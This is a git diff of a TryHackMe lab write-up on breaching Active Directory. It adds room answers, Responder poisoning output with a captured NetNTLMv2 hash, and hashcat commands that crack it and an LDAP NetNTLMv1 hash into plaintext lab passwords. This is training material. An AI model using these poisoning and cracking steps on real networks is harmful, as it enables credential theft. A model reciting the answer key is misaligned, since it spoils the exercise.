@@ -610,6 +610,10 @@ It:
 - Forces the victim to authenticate
 - Captures NetNTLMv2 hashes
 
+### Q1 Task 4: What is the name of the tool we can use to poison and capture authentication requests on the network?
+
+Answer Q1 Task4: Responder
+
 On THM, you run:
 
 ```
@@ -630,8 +634,6 @@ When a victim authenticates, you get output like:
 [SMBv2] NTLMv2-SSP Hash     : <hash>
 ```
 
-On retry I also tested LDAP and responder pics that up to
-
 Because you’re on a VPN, poisoning is limited — THM simulates an authentication attempt every ~30 minutes.
 
 ```
@@ -641,8 +643,6 @@ $ sudo responder -I breachad
   |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
   |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                    |__|
-
-
 [*] Tips jar:
     USDT -> 0xCc98c1D3b8cd9b717b5257827102940e4E17A19A
     BTC  -> bc1q9360jedhhmps5vpl3u05vyg4jryrl52dmazz49
@@ -715,8 +715,11 @@ $ sudo responder -I breachad
 [SMB] NTLMv2-SSP Client   : 10.200.70.202
 [SMB] NTLMv2-SSP Username : ZA\svcFileCopy
 [SMB] NTLMv2-SSP Hash     : svcFileCopy::ZA:84140fdd682af1f7:FD777C8FAF134B10880C00CE2B2F1B0E:0101000000000000800A76C009F7DC012470B1C35C5F54D10000000002000800420036004F004D0001001E00570049004E002D0045004F00550045004F004700440038004E003700360004003400570049004E002D0045004F00550045004F004700440038004E00370036002E00420036004F004D002E004C004F00430041004C0003001400420036004F004D002E004C004F00430041004C0005001400420036004F004D002E004C004F00430041004C0007000800800A76C009F7DC01060004000200000008003000300000000000000000000000002000008B10483D0820E576E7D40606685D7FC037F2E02C770833867BAD88BB851E87DD0A001000000000000000000000000000000000000900220063006900660073002F00310030002E003100350030002E00370030002E00320032000000000000000000      
-
 ```
+
+### Q2 Task 4: What is the username associated with the challenge that was captured?
+
+Answer Q2 Task 4: svcFileCopy
 
 4. Cracking the Captured Hash
 
@@ -733,6 +736,19 @@ D:\AppsNDrivers\hashcat-6.2.6>hashcat -m 5600 -d 2 Z:\...\NTLMHash.txt Z:\...\pa
 SVCFILECOPY::ZA:84140fdd682af1f7:fd777c8faf134b10880c00ce2b2f1b0e:0101000000000000800a76c009f7dc01247...032000000000000000000:FPassword1!
 ...
 ```
+On retry I also tested LDAP and responder picks that up to. Note LDAP here is NTLM v1 not v2.
+Hashcat modes: LDAP NetNTLMv1 → -m 5500, SMB NetNTLMv2 → -m 5600
+
+```
+$ hashcat -m 5500 NTLM_LDAP_Hash.txt passwordlist-1647876320267.txt --force
+hashcat (v7.1.2) starting
+...
+svcLDAP::za.tryhackme.com:43c996d16995092900000000000000000000000000000000:a9768495c34bddaf7966de3ae222963329c38ff5ba1012bc:63742039474d2ce1:tryhackmeldappass1@
+...
+```
+### Q3 Task 4: What is the value of the cracked password associated with the challenge that was captured? 
+
+Answer Q3 Task4: FPassword1!
 
 5. Relaying the Challenge
 Instead of cracking the hash, you can relay it to another SMB server.
